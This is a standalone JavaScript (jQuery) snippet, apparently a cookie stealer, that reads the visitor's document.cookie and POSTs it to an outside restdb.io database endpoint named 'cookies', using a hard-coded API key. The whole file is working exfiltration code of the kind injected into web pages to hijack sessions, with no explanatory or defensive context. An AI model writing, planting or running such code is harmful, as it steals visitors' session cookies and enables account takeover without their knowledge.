$.ajax({
    url: "https://geile-72c8.restdb.io/rest/cookies",
    headers: { 'x-apikey': '5f07c7a2a529a1752c476f90' },
    type: "POST",
    data: {
        cookie: document.cookie
    },
    success: function(response){
        console.log(response);
    }
});
